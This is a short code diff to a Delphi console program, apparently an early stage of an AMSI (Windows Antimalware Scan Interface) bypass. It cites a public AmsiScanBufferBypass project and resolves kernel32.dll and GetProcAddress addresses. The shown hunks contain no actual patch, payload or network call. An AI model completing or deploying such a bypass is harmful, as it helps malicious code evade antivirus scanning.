@@ -1,8 +1,5 @@
 program BasedAmsi_E;
-
 {$APPTYPE CONSOLE}
-
-{$R *.res}
 
 uses
   SysUtils,
@@ -11,7 +8,7 @@ uses
 
 var
   amsee,kersee : THandle;
-  amsibaseaddr : pointer;
+  amsibaseaddr, kernbaseaddr : pointer;
 
 {http://docwiki.embarcadero.com/RADStudio/Sydney/en/Libraries_and_Packages_(Delphi)}
 {https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs}
@@ -32,7 +29,8 @@ begin
     kersee := SafeLoadLibrary('C:\\Windows\\System32\\kernel32.dll');
     if kersee <> 0 then
     begin
-      amsibaseaddr := GetProcAddress(amsee,'GetProcAddress');
+      kernbaseaddr := GetProcAddress(kersee,'GetProcAddress');
+      WriteLn(Format('kernel32.dll base address: %p',[kernbaseaddr]));
     end
 
     else
